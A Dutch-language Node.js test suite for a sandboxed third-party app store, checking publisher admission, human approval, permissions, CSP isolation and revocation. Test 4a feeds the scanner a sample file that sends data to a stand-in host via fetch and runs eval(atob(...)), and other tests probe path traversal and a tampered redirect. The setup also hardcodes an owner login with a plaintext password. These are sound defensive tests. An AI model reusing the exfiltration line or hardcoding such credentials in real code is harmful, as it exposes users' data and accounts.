/* DE RTG APP STORE -- het derdenkanaal, van aanvraag tot cel.

   Deze toets legt de zes grenzen uit kern/appstore/index.js vast. Elke test
   hieronder zakt op een echte verzwakking en niet op een naam:

     1. derdencode draait nooit op de RTG-herkomst  -> test 8 (de koppen van de cel)
     2. de machine keurt nooit goed                 -> test 5 en 6
     3. een app ziet codenamen, nooit een naam      -> test 7c
     4. een niet-verleende machtiging bestaat niet  -> test 7b
     5. intrekken werkt onmiddellijk en overal      -> test 10
     6. wat er niet is, staat er met een reden      -> test 4c

   Draai los: node --experimental-sqlite --test test/appstore.test.js */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { startServer, stop } = require('./helper');
const { MACHTIGINGEN } = require('../server/kern/appstore/machtigingen');

const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'rtg-appstore-'));
let srv, base, lid, sup, supVrij, office, tech;
const ORG = 'O-APPSTORE';

function api(pad, body, token) {
  const h = { 'Content-Type': 'application/json' };
  if (token) h.Authorization = 'Bearer ' + token;
  return fetch(base + pad, { method: 'POST', headers: h, body: JSON.stringify(body || {}) })
    .then(async r => ({ status: r.status, body: await r.json().catch(() => ({})) }));
}
function haal(pad, kop) {
  return fetch(base + pad, { headers: Object.assign({ 'Accept-Encoding': 'identity' }, kop || {}) })
    .then(async r => ({ status: r.status, kop: r.headers, tekst: await r.text().catch(() => '') }));
}
async function supplierToken(code) {
  const roster = (await api('/api/supplier/roster', { code })).body;
  const staff = (roster.staff || []).find(x => x.role === 'manager') || (roster.staff || [])[0];
  assert.ok(staff, 'zaak ' + code + ' heeft personeel in de demostand');
  // de manager van een demozaak heeft PIN 1234 (server/kern/staffseed.js)
  const r = await api('/api/supplier/login', { code, staffId: staff.id, pin: staff.role === 'manager' ? '1234' : '5678' });
  assert.ok(r.body.token, 'ingelogd bij ' + code + ': ' + (r.body.error || ''));
  return r.body.token;
}

/* Een kleine, eerlijke app: een teller die zijn stand onthoudt. Precies wat een
   derde als eerste zou bouwen, en precies wat er doorheen hoort te komen. */
const APP_HTML = '<!doctype html><html lang="nl"><head><meta charset="utf-8"><title>Teller</title>' +
  '<link href="stijl.css" rel="stylesheet"></head><body><h1>Teller</h1><p id="n">0</p>' +
  '<button id="tel" type="button">Tel op</button><script src="app.js"></script></body></html>';
const APP_JS = 'var n = 0;\n' +
  'document.getElementById("tel").addEventListener("click", function () {\n' +
  '  n += 1; document.getElementById("n").textContent = String(n);\n' +
  '  RTG.roep("opslag.zet", { sleutel: "stand", waarde: String(n) });\n' +
  '});\n';
const APP_CSS = 'body{font-family:system-ui;padding:2rem;}';
const bundel = (extra) => [
  { pad: 'index.html', inhoud: APP_HTML }, { pad: 'app.js', inhoud: APP_JS }, { pad: 'stijl.css', inhoud: APP_CSS }
].concat(extra || []);
const manifest = (over) => Object.assign({
  sleutel: 'derden-teller', naam: 'Teller van Derden', versie: '1.0.0',
  uitleg: 'Een eenvoudige teller die onthoudt hoe ver je was, ook als je de app sluit.',
  categorie: 'leven', machtigingen: [
    { id: 'opslag.eigen', doel: 'voortgang-onthouden' },
    { id: 'profiel.basis', doel: 'aanspreken' },
    { id: 'bericht.klaarzetten', doel: 'herinneren' }]
}, over || {});

let versieId = null, hash = null;

test.before(async () => {
  srv = await startServer({ env: { SMTP_URL: '', RTG_DATA_DIR: TMP } });
  base = srv.base;
  const reg = await api('/api/auth/register', { name: 'App Lid', email: 'appstore@x.nl', phone: '0612345699',
    password: 'geheim123', geboortedatum: '1990-01-01', tier: 'rtg', pasApp: 'rtg' });
  lid = reg.body.token; assert.ok(lid, 'lid geregistreerd');
  office = (await api('/api/office/login', { code: 'RTG-OFFICE' })).body.token;
  assert.ok(office, 'kantoor ingelogd');
  tech = (await api('/api/techniek/inloggen', { login: 'roellie.i@gmail.com', wachtwoord: 'Imran' })).body.token;
  assert.ok(tech, 'de eigenaar komt op de technische pagina');
  sup = await supplierToken('KIKUNOI');
  supVrij = await supplierToken('SAKURA');
  assert.ok(sup && supVrij, 'twee zaken ingelogd');
  // alleen de EERSTE zaak hangt onder een organisatie
  assert.equal((await api('/api/techniek/tenant', { org: ORG, naam: 'Uitgeverij Kikunoi' }, tech)).status, 200);
  assert.equal((await api('/api/techniek/tenant/bind', { org: ORG, soort: 'zaak', code: 'KIKUNOI' }, tech)).status, 200);
});
test.after(() => { stop(srv && srv.child); try { fs.rmSync(TMP, { recursive: true, force: true }); } catch (e) {} });

test('1. een zaak zonder organisatie erachter wordt geen uitgever', async () => {
  const r = await api('/api/appstore/uitgever/aanvraag', { naam: 'Losse zaak', contact: 'dev@los.nl' }, supVrij);
  assert.equal(r.status, 409, 'geen tenant = geen uitgeversplek');
  assert.match(r.body.error, /aanspreekbare rechtspersoon/, 'en de reden staat erbij');
  assert.equal((await api('/api/appstore/uitgever/inzenden', { manifest: manifest(), bestanden: bundel() }, supVrij)).status, 409);
});

test('2. een aanvraag is nog geen uitgeversplek: inzenden kan pas na een mens', async () => {
  const a = await api('/api/appstore/uitgever/aanvraag', { naam: 'Uitgeverij Kikunoi', contact: 'dev@kikunoi.jp' }, sup);
  assert.equal(a.status, 200);
  assert.equal(a.body.uitgever.status, 'aangevraagd');
  const in1 = await api('/api/appstore/uitgever/inzenden', { manifest: manifest(), bestanden: bundel() }, sup);
  assert.equal(in1.status, 403, 'zolang de aanvraag loopt, komt er niets binnen');
  assert.match(in1.body.error, /ligt bij RTG/);
});

test('3. de organisatie komt uit het register, niet uit de body', async () => {
  /* De uitgever kan zijn eigen org niet meesturen: het veld bestaat niet in het
     antwoordpad. Zou hij toch iets meesturen, dan wordt het genegeerd en blijft
     de plek op zijn eigen org staan. */
  await api('/api/appstore/uitgever/aanvraag', { naam: 'Kwaadwillend', contact: 'x@y.nl', org: 'O-IEMAND-ANDERS' }, sup);
  const mijn = await api('/api/appstore/uitgever', {}, sup);
  assert.equal(mijn.body.org, ORG, 'de org blijft die van het tenantregister');
});

test('4. de machinepoort keurt op vorm, met bestand, regel en de weg eruit', async () => {
  const t = await api('/api/appstore/kantoor/uitgever', { org: ORG, besluit: 'toegelaten', door: 'Sam van RTG' }, office);
  assert.equal(t.status, 200, 'een MENS laat de uitgever toe');

  // 4a. de verboden vormen worden gevonden, met regelnummer
  const vies = await api('/api/appstore/uitgever/inzenden', { manifest: manifest(), bestanden: bundel().concat([
    { pad: 'kwaad.js', inhoud: 'var a = 1;\nfetch("https://elders.example/steel");\neval(atob("eA=="));\n' }
  ]) }, sup);
  assert.equal(vies.status, 422, 'de poort houdt hem tegen');
  const namen = vies.body.bevindingen.map(b => b.wat);
  assert.ok(namen.includes('fetch()'), 'fetch wordt genoemd');
  assert.ok(namen.includes('eval()'), 'eval wordt genoemd');
  const f = vies.body.bevindingen.find(b => b.wat === 'fetch()');
  assert.equal(f.bestand, 'kwaad.js');
  assert.equal(f.regel, 2, 'met het regelnummer erbij');
  assert.ok(f.hoe.length > 20, 'en met hoe het wel kan');

  // 4b. het budget is een poort en geen meter achteraf
  const zwaar = await api('/api/appstore/uitgever/inzenden', { manifest: manifest(),
    bestanden: bundel([{ pad: 'zwaar.js', inhoud: '/*' + 'x'.repeat(400 * 1024) + '*/' }]) }, sup);
  assert.equal(zwaar.status, 422);
  assert.ok(zwaar.body.bevindingen.some(b => /scriptcode/.test(b.wat)), 'te veel scriptcode komt er niet in');

  // 4c. een machtiging die niet bestaat, krijgt de REDEN en niet alleen een nee
  const vraagt = await api('/api/appstore/uitgever/inzenden', {
    manifest: manifest({ machtigingen: ['betalen.starten'] }), bestanden: bundel() }, sup);
  assert.equal(vraagt.status, 400);
  assert.match(vraagt.body.fouten[0].wat, /Geld verlaat het huis nooit vanzelf/);

  // 4d. de proefkeuring doet hetzelfde en bewaart niets
  const proef = await api('/api/appstore/uitgever/proef', { manifest: manifest(), bestanden: bundel() }, sup);
  assert.equal(proef.body.door, true);
  assert.match(proef.body.let, /geen goedkeuring/, 'ook een geslaagde proef zegt dat hij niets goedkeurt');
  assert.equal((await api('/api/appstore/uitgever', {}, sup)).body.apps.length, 0, 'de proef heeft niets bewaard');
});

test('5. door de machine is NIET gepubliceerd', async () => {
  const r = await api('/api/appstore/uitgever/inzenden', { manifest: manifest(), bestanden: bundel() }, sup);
  assert.equal(r.status, 200, 'de schone bundel komt door de vormcontrole: ' + JSON.stringify(r.body.bevindingen || r.body.fouten || r.body.error || ''));
  assert.equal(r.body.versie.status, 'wacht-op-mens');
  versieId = r.body.versie.id; hash = r.body.versie.hash;
  assert.equal((await api('/api/appstore/catalogus', {}, lid)).body.totaal, 0, 'en staat dus NIET in de winkel');
  assert.equal((await haal('/appcel/derden-teller/' + hash + '/index.html')).status, 404, 'en de cel is dicht');

  // dezelfde bundel nog eens is geen tweede versie maar een melding
  const nog = await api('/api/appstore/uitgever/inzenden', { manifest: manifest(), bestanden: bundel() }, sup);
  assert.equal(nog.status, 409);
  assert.match(nog.body.error, /byte voor byte/);
});

test('6. publiceren kan alleen een mens van RTG, niet de uitgever zelf', async () => {
  assert.equal((await api('/api/appstore/kantoor/besluit', { versieId, besluit: 'gepubliceerd', door: 'Sam' }, sup)).status, 401,
    'een uitgeverstoken komt de keuringsdeur niet door');
  assert.equal((await api('/api/appstore/kantoor/besluit', { versieId, besluit: 'gepubliceerd' }, office)).status, 400,
    'een besluit zonder naam is een besluit dat niemand nam');
  const w = await api('/api/appstore/kantoor/wachtrij', {}, office);
  assert.ok(w.body.inzendingen.some(v => v.id === versieId), 'hij staat in de wachtrij');
  assert.match(w.body.let, /keurt nooit goed/);
  /* De toegankelijkheidspoort (besluit 27 augustus 2026): publiceren kan pas na
     een geslaagde keuring op DEZE bundelhash. In het echt doet de keurloper dat;
     deze toets gaat over de zes grenzen en niet over de keuring.

     Wat hier wel bij hoort: de mens die aftekent moet de uitslag KUNNEN ZIEN.
     Zonder dat drukt hij op Publiceren, krijgt een weigering terug en mag zelf
     raden waarom -- en dan is de poort een muur. */
  assert.equal(w.body.inzendingen.find(v => v.id === versieId).toegankelijk, null,
    'zolang er niets is gekeurd, staat er ook geen uitslag bij de inzending');
  const zonder = await api('/api/appstore/kantoor/besluit', { versieId, besluit: 'gepubliceerd', door: 'Sam van RTG' }, office);
  assert.equal(zonder.status, 409, 'en publiceren kan dan niet');
  assert.match(zonder.body.error, /nog niet over deze bundel gedraaid/);
  await api('/api/appstore/kantoor/toegankelijk', { versieId, stand: 'in-orde', fouten: 0 }, office);
  const w2 = await api('/api/appstore/kantoor/wachtrij', {}, office);
  const na = w2.body.inzendingen.find(v => v.id === versieId).toegankelijk;
  assert.equal(na && na.stand, 'in-orde', 'daarna reist de uitslag mee naar het keuringsscherm');
  assert.equal(na.hash, w.body.inzendingen.find(v => v.id === versieId).hash,
    'en hij hangt aan de bundel waarover hij gaat');
  const b = await api('/api/appstore/kantoor/besluit', { versieId, besluit: 'gepubliceerd', door: 'Sam van RTG' }, office);
  assert.equal(b.status, 200);
  assert.equal(b.body.versie.status, 'gepubliceerd');
  const cat = await api('/api/appstore/catalogus', {}, lid);
  assert.equal(cat.body.totaal, 1);
  assert.equal(cat.body.items[0].uitgever.org, ORG, 'de uitgever staat bij de app');
  assert.equal(cat.body.items[0].vraagt.length, 3);
});

test('7. het lid VERLEENT; de brug leest die verlening en niet het manifest', async () => {
  // 7a. openen zonder installeren kan niet
  assert.equal((await api('/api/appstore/open', { sleutel: 'derden-teller' }, lid)).status, 403);

  // het lid geeft er EEN van de twee
  const i = await api('/api/appstore/installeer', { sleutel: 'derden-teller', machtigingen: ['opslag.eigen'] }, lid);
  assert.equal(i.status, 200);
  assert.equal(i.body.verleend.length, 1);
  assert.match(i.body.let, /1 van de 3/);

  const open = await api('/api/appstore/open', { sleutel: 'derden-teller' }, lid);
  assert.equal(open.body.start, '/appcel/derden-teller/' + hash + '/index.html');

  // 7b. GRENS 4: wat niet verleend is, bestaat niet -- ook al vroeg het manifest erom
  const nee = await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'profiel.wieBenIk' }, lid);
  assert.equal(nee.status, 403);
  assert.match(nee.body.error, /profiel\.basis/);

  const ja = await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'opslag.zet', args: { sleutel: 'stand', waarde: '7' } }, lid);
  assert.equal(ja.status, 200);
  assert.equal((await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'opslag.lees', args: { sleutel: 'stand' } }, lid)).body.uit.waarde, '7');

  // 7c. GRENS 3: ook MET de machtiging komt er geen naam of e-mailadres uit
  await api('/api/appstore/verleen', { sleutel: 'derden-teller', machtigingen: ['opslag.eigen', 'profiel.basis'] }, lid);
  const wie = await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'profiel.wieBenIk' }, lid);
  assert.equal(wie.status, 200);
  const plat = JSON.stringify(wie.body.uit).toLowerCase();
  assert.ok(!plat.includes('app lid'), 'geen echte naam');
  assert.ok(!plat.includes('appstore@x.nl'), 'geen e-mailadres');
  assert.ok(!plat.includes('0612345699'), 'geen telefoonnummer');
  assert.ok(wie.body.uit.codenaam, 'wel een codenaam');

  // een machtiging weer intrekken zonder de app te verwijderen
  const w = await api('/api/appstore/verleen', { sleutel: 'derden-teller', machtigingen: [] }, lid);
  assert.equal(w.body.ingetrokken.length, 2);
  assert.equal((await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'opslag.lees', args: { sleutel: 'stand' } }, lid)).status, 403);
  await api('/api/appstore/verleen', { sleutel: 'derden-teller', machtigingen: ['opslag.eigen', 'bericht.klaarzetten'] }, lid);

  // een onbekende methode noemt de bestaande methodes
  const gek = await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'systeem.rootShell' }, lid);
  assert.equal(gek.status, 400);
  assert.match(gek.body.error, /opslag\.zet/);
});

test('8. GRENS 1: de cel draait op een naamloze herkomst, zonder netwerk', async () => {
  const r = await haal('/appcel/derden-teller/' + hash + '/index.html');
  assert.equal(r.status, 200);
  const csp = r.kop.get('content-security-policy');
  assert.match(csp, /sandbox allow-scripts/, 'ook wie de URL los opent, zit in een naamloze herkomst');
  assert.ok(!/allow-same-origin/.test(csp), 'en krijgt nooit onze herkomst terug');
  assert.match(csp, /connect-src 'none'/, 'geen netwerk, niet eens naar ons');
  assert.match(csp, /default-src 'none'/);
  assert.match(csp, /form-action 'none'/);
  assert.match(csp, /object-src 'none'/);
  assert.equal(r.kop.get('x-content-type-options'), 'nosniff');
  /* En de kop die opzet/koppen.js hier moet loslaten. Een naamloze herkomst is
     voor de browser een ANDERE herkomst, dus met de standaard
     `same-origin` blokkeert Chromium de eigen app.js van de app -- in de cel,
     waar niemand het ziet. Dit is precies de fout die geen enkele toets over de
     lijn vond en die pas in een echte browser bovenkwam
     (test/appstore.e2e.js). */
  assert.equal(r.kop.get('cross-origin-resource-policy'), 'cross-origin',
    'anders blokkeert de browser de bundel voor de cel die hem juist veilig maakt');
  assert.match(r.kop.get('cache-control'), /immutable/, 'de hash staat in het pad, dus dit mag voorgoed bewaard');
  assert.ok(r.tekst.includes('<script src="/appcel/brug.js"></script>'), 'de brugklant staat erin, en de app kan hem niet vergeten');
  assert.ok(r.tekst.indexOf('/appcel/brug.js') < r.tekst.indexOf('app.js'), 'en staat voor de eigen code van de app');

  // de brugklant zelf praat alleen met het venster erboven
  const brug = await haal('/appcel/brug.js');
  assert.equal(brug.status, 200);
  assert.ok(brug.tekst.includes('window.parent.postMessage'), 'de enige weg naar buiten');
  assert.ok(brug.tekst.includes("e.source!==window.parent"), 'en hij luistert alleen naar dat venster');

  // een andere hash van dezelfde app bestaat niet
  assert.equal((await haal('/appcel/derden-teller/' + 'a'.repeat(32) + '/index.html')).status, 404);
  // een pad buiten de bundel ook niet
  assert.equal((await haal('/appcel/derden-teller/' + hash + '/bundel.json')).status, 404);
  assert.equal((await haal('/appcel/derden-teller/' + hash + '/..%2F..%2Fdb.json')).status, 404);
});

test('9. wat van schijf komt en niet klopt, komt er niet uit', async () => {
  const vol = path.join(TMP, 'appstore', 'derden-teller', hash, 'app.js');
  const echt = fs.readFileSync(vol);
  fs.writeFileSync(vol, 'window.location = "https://elders.example";');
  try {
    assert.equal((await haal('/appcel/derden-teller/' + hash + '/app.js')).status, 404,
      'een gewijzigd bestand wordt niet uitgeleverd -- het gaat luid stuk, niet stil door');
  } finally { fs.writeFileSync(vol, echt); }
  assert.equal((await haal('/appcel/derden-teller/' + hash + '/app.js')).status, 200, 'en daarna gewoon weer wel');
});

test('10. GRENS 5: intrekken werkt onmiddellijk en overal', async () => {
  // eerst nog even bewijzen dat de app er echt stond
  assert.equal((await api('/api/appstore/mijn', {}, lid)).body.apps.length, 1);
  const bericht = await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'bericht.zet', args: { tekst: 'Je teller staat op 7.' } }, lid);
  assert.equal(bericht.status, 200);
  assert.equal((await api('/api/appstore/berichten', { sleutel: 'derden-teller' }, lid)).body.berichten.length, 1);

  const t = await api('/api/appstore/kantoor/intrekken', { sleutel: 'derden-teller', reden: 'toets', door: 'Sam van RTG' }, office);
  assert.equal(t.status, 200);
  assert.equal((await api('/api/appstore/catalogus', {}, lid)).body.totaal, 0, 'weg uit de winkel');
  assert.equal((await api('/api/appstore/mijn', {}, lid)).body.apps.length, 0, 'weg bij het lid dat hem al had');
  assert.equal((await api('/api/appstore/open', { sleutel: 'derden-teller' }, lid)).status, 404, 'niet meer te openen');
  assert.equal((await haal('/appcel/derden-teller/' + hash + '/index.html')).status, 404, 'en de cel is dicht');
  assert.equal((await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'opslag.lees', args: { sleutel: 'stand' } }, lid)).status, 404,
    'de brug van een ingetrokken app is ook dicht');
});

test('11. een geschorste uitgever verliest zijn etalage op hetzelfde moment', async () => {
  // opnieuw publiceren om de schorsing echt iets te laten omzetten
  const r = await api('/api/appstore/uitgever/inzenden', { manifest: manifest({ versie: '1.0.1' }),
    bestanden: bundel([{ pad: 'extra.txt', inhoud: 'versie 1.0.1' }]) }, sup);
  assert.equal(r.status, 200, JSON.stringify(r.body.bevindingen || r.body.error || ''));
  await api('/api/appstore/kantoor/toegankelijk', { versieId: r.body.versie.id, stand: 'in-orde', fouten: 0 }, office);
  assert.equal((await api('/api/appstore/kantoor/besluit', { versieId: r.body.versie.id, besluit: 'gepubliceerd', door: 'Sam van RTG' }, office)).status, 200);
  assert.equal((await api('/api/appstore/catalogus', {}, lid)).body.totaal, 1);

  const s = await api('/api/appstore/kantoor/uitgever', { org: ORG, besluit: 'geschorst', reden: 'toets: de uitgever bleek onbereikbaar', door: 'Sam van RTG' }, office);
  assert.equal(s.status, 200);
  assert.equal(s.body.appsGevallen, 1, 'de lopende app valt mee');
  assert.equal((await api('/api/appstore/catalogus', {}, lid)).body.totaal, 0);
  assert.equal((await api('/api/appstore/uitgever/inzenden', { manifest: manifest({ versie: '1.0.2' }), bestanden: bundel() }, sup)).status, 403);

  // en het journaal onthoudt het, met naam en reden
  const j = await api('/api/appstore/kantoor/journaal', {}, office);
  const regel = j.body.journaal.find(x => x.wat === 'uitgever-geschorst');
  assert.ok(regel && regel.wie === 'Sam van RTG' && /onbereikbaar/.test(regel.reden), 'de schorsing staat in het journaal');
});

test('12. elke machtiging in de catalogus wordt door de brug uitgevoerd', () => {
  /* LAT-regel 6: een belofte in tekst is een belofte in code. Een machtiging die
     wel te vragen is en nergens iets doet, is precies zo'n belofte -- en een
     lid dat hem verleent, verleent iets wat niet bestaat. */
  /* Uit de DRAAIENDE brug en niet uit zijn broncode. De eerste versie las
     brug.js als tekst; toen de methodetabel naar een eigen bestand verhuisde,
     zakte deze toets op een verhuizing in plaats van op een gebroken belofte --
     en dat is niet wat hij hoort te bewaken. */
  const { maakBrug } = require('../server/kern/appstore/brug');
  const staat = { opslag: {}, bakjes: {} };
  const brug = maakBrug({ S: () => staat, save() {}, boek() {},
    nu: () => new Date().toISOString(), eigen: (o, k) => o[k] });
  const gebruikt = new Set(Object.values(brug.machtigingen));
  for (const m of MACHTIGINGEN) {
    assert.ok(gebruikt.has(m.id),
      'machtiging ' + m.id + ' staat in de catalogus maar wordt door geen enkele methode van de brug gebruikt');
  }
});

test('13. de uitgever heeft zijn eigen noodrem, en het lid zijn eigen gum', async () => {
  /* Een uitgever die een fout in zijn eigen app ziet, hoort niet op een kantoor
     te hoeven wachten. En een lid dat een app weghaalt, houdt wat hij erin had
     staan -- dat is zijn inhoud en niet die van de app -- tenzij hij het zelf
     weggooit. Beide wegen staan hier, want beide bestonden alleen in de code. */
  const her = await api('/api/appstore/kantoor/uitgever', { org: ORG, besluit: 'toegelaten', door: 'Sam van RTG' }, office);
  assert.equal(her.status, 200, 'de schorsing uit toets 11 wordt weer opgeheven');
  const r = await api('/api/appstore/uitgever/inzenden', { manifest: manifest({ versie: '1.1.0' }),
    bestanden: bundel([{ pad: 'extra.txt', inhoud: 'versie 1.1.0' }]) }, sup);
  assert.equal(r.status, 200, JSON.stringify(r.body.bevindingen || r.body.error || ''));
  await api('/api/appstore/kantoor/toegankelijk', { versieId: r.body.versie.id, stand: 'in-orde', fouten: 0 }, office);
  assert.equal((await api('/api/appstore/kantoor/besluit', { versieId: r.body.versie.id, besluit: 'gepubliceerd', door: 'Sam van RTG' }, office)).status, 200);

  // de uitgever ziet wat een lid straks ziet
  const vb = await api('/api/appstore/uitgever/voorbeeld', { sleutel: 'derden-teller' }, sup);
  assert.equal(vb.status, 200);
  assert.equal(vb.body.kaart.uitgever.org, ORG);
  assert.equal((await api('/api/appstore/uitgever/voorbeeld', { sleutel: 'niet-van-mij' }, sup)).status, 404,
    'en niet die van een ander');

  // het lid installeert opnieuw; wat de app eerder opsloeg, staat er nog
  await api('/api/appstore/installeer', { sleutel: 'derden-teller', machtigingen: ['opslag.eigen', 'bericht.klaarzetten'] }, lid);
  assert.equal((await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'opslag.lees', args: { sleutel: 'stand' } }, lid)).body.uit.waarde, '7',
    'wat het lid in deze app had staan, is er nog -- dat is zijn inhoud');

  // het bakje: het lid leest, de app kan niet zien dat hij gelezen is
  assert.equal((await api('/api/appstore/mijn', {}, lid)).body.berichten['derden-teller'], 1, 'een ongelezen bericht telt mee');
  const gl = await api('/api/appstore/berichten/gelezen', { sleutel: 'derden-teller' }, lid);
  assert.equal(gl.body.gelezen, 1);
  assert.equal((await api('/api/appstore/mijn', {}, lid)).body.berichten['derden-teller'], undefined, 'daarna niet meer');

  // de eigen gum van het lid: pas hiermee is het echt weg
  assert.equal((await api('/api/appstore/wis-opslag', { sleutel: 'derden-teller' }, lid)).status, 200);
  assert.equal((await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'opslag.lees', args: { sleutel: 'stand' } }, lid)).body.uit.waarde, null);
  assert.equal((await api('/api/appstore/berichten', { sleutel: 'derden-teller' }, lid)).body.berichten.length, 0);

  // van het startscherm af
  assert.equal((await api('/api/appstore/weg', { sleutel: 'derden-teller' }, lid)).status, 200);
  assert.equal((await api('/api/appstore/mijn', {}, lid)).body.apps.length, 0);
  assert.equal((await api('/api/appstore/weg', { sleutel: 'derden-teller' }, lid)).status, 404, 'twee keer weghalen is niet stil');

  // en de uitgever trekt zijn eigen app terug, zonder kantoor
  const t = await api('/api/appstore/uitgever/intrekken', { sleutel: 'derden-teller', reden: 'fout in 1.1.0' }, sup);
  assert.equal(t.status, 200);
  assert.match(t.body.let, /meteen weg/);
  assert.equal((await api('/api/appstore/catalogus', {}, lid)).body.totaal, 0);
  assert.equal((await api('/api/appstore/uitgever/intrekken', { sleutel: 'derden-teller', reden: 'nog eens' }, sup)).status, 409,
    'wat al weg is, gaat niet nog een keer weg');
});

test('14. een geweigerde versie laat geen bytes achter, wel het bewijs', async () => {
  const r = await api('/api/appstore/uitgever/inzenden', { manifest: manifest({ sleutel: 'derden-afkeur', versie: '0.1.0' }),
    bestanden: bundel([{ pad: 'niks.txt', inhoud: 'een versie die wordt afgewezen' }]) }, sup);
  assert.equal(r.status, 200, JSON.stringify(r.body.bevindingen || r.body.error || ''));
  const map = path.join(TMP, 'appstore', 'derden-afkeur', r.body.versie.hash);
  assert.equal(fs.existsSync(map), true, 'de bundel staat er zolang hij op een mens wacht');

  assert.equal((await api('/api/appstore/kantoor/besluit', { versieId: r.body.versie.id, besluit: 'geweigerd' }, office)).status, 400,
    'een weigering zonder naam wordt niet aangenomen');
  assert.equal((await api('/api/appstore/kantoor/besluit', { versieId: r.body.versie.id, besluit: 'geweigerd', reden: 'kort', door: 'Sam van RTG' }, office)).status, 400,
    'en een weigering zonder deugdelijke reden ook niet');

  const w = await api('/api/appstore/kantoor/besluit', { versieId: r.body.versie.id, besluit: 'geweigerd',
    reden: 'de app doet niet wat hij in zijn uitleg belooft', door: 'Sam van RTG' }, office);
  assert.equal(w.status, 200);
  assert.equal(fs.existsSync(map), false, 'daarna liggen de bytes er niet meer: niets kan ze nog uitleveren');
  /* Wat het bewijs draagt blijft wel staan -- anders is een weigering achteraf
     niet na te trekken en is de hele keuring een gebaar. */
  const mijn = await api('/api/appstore/uitgever', {}, sup);
  const afgekeurd = mijn.body.apps.find(a => a.sleutel === 'derden-afkeur').versies[0];
  assert.equal(afgekeurd.status, 'geweigerd');
  assert.equal(afgekeurd.hash, r.body.versie.hash);
  assert.equal(afgekeurd.besluit.door, 'Sam van RTG');
  assert.match(afgekeurd.besluit.reden, /niet wat hij in zijn uitleg belooft/);
});

test('15. kantoor en uitgever lezen hun nieuwe werktafels via de echte deuren', async () => {
  const wachtrij = await api('/api/appstore/kantoor/toegankelijk/wachtrij', {}, office);
  assert.equal(wachtrij.status, 200);
  assert.ok(Array.isArray(wachtrij.body.lijst));

  const naslag = await api('/api/appstore/naslag', {}, sup);
  assert.equal(naslag.status, 200);
  assert.ok(Array.isArray(naslag.body.methodes), 'de SDK-methodes komen uit dezelfde naslagbron');

  const cijfers = await api('/api/appstore/uitgever/cijfers', { dagen: 30 }, sup);
  assert.equal(cijfers.status, 200);
  assert.ok(Array.isArray(cijfers.body.apps));

  const journaal = await api('/api/appstore/uitgever/journaal', {}, sup);
  assert.equal(journaal.status, 200);
  assert.ok(Array.isArray(journaal.body.lijst));
});

test('16. zonder inlog en zonder pas blijft alles dicht', async () => {
  assert.equal((await api('/api/appstore/catalogus', {})).status, 401);
  assert.equal((await api('/api/appstore/brug', { sleutel: 'derden-teller', methode: 'opslag.lijst' })).status, 401);
  assert.equal((await api('/api/appstore/uitgever/inzenden', { manifest: manifest(), bestanden: bundel() })).status, 401);
  assert.equal((await api('/api/appstore/kantoor/wachtrij', {})).status, 401);
});
